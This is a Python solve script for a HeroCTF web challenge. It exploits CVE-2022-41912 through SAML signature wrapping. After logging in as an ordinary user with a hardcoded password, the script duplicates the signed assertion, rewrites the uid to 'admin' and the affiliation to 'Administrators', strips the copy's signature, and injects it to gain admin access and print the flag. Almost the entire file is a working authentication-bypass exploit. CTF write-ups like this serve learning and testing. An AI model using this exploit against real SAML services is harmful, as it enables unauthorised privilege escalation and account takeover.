import re
from base64 import b64decode, b64encode
from html.parser import HTMLParser

import requests
from lxml import etree

app = "http://web.heroctf.fr:8080"
idp = "http://web.heroctf.fr:8081"
password = "oyJPNYd3HgeBkaE%!rP#dZvqf2z*4$^qcCW4V6WM"


class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.inputs = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            attrs_dict = dict(attrs)
            if "name" in attrs_dict and "value" in attrs_dict:
                self.inputs[attrs_dict["name"]] = attrs_dict["value"]


s = requests.Session()

r = s.get(f"{app}/flag", allow_redirects=True)
parser = FormParser()
parser.feed(r.text)

login_data = {
    "user": "user",
    "password": password,
    "SAMLRequest": parser.inputs["SAMLRequest"],
    "RelayState": parser.inputs["RelayState"],
}
r = s.post(f"{idp}/sso", data=login_data, allow_redirects=False)

parser2 = FormParser()
parser2.feed(r.text)
saml_resp = parser2.inputs["SAMLResponse"]
relay_state = parser2.inputs["RelayState"]

# CVE-2022-41912
xml = etree.fromstring(b64decode(saml_resp))
ns = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
}

orig = xml.find(".//saml:Assertion", ns)

evil = etree.fromstring(etree.tostring(orig))
evil.set("ID", "id-evil")

for attr in evil.findall(".//saml:Attribute", ns):
    friendly = attr.get("FriendlyName", "")
    val_elem = attr.find("saml:AttributeValue", ns)
    if friendly == "uid":
        val_elem.text = "admin"
    if friendly == "eduPersonAffiliation":
        val_elem.text = "Administrators"

sig = evil.find(".//{http://www.w3.org/2000/09/xmldsig#}Signature")
if sig is not None:
    sig.getparent().remove(sig)

orig.addnext(evil)

modified = b64encode(etree.tostring(xml)).decode()
r = s.post(
    f"{app}/saml/acs",
    data={"SAMLResponse": modified, "RelayState": relay_state},
    allow_redirects=True,
)

print(re.search(r"Hero\{[^}]+\}", r.text).group())

# Hero{S4ML_3XPL01T_FR0M_CR3J4M}
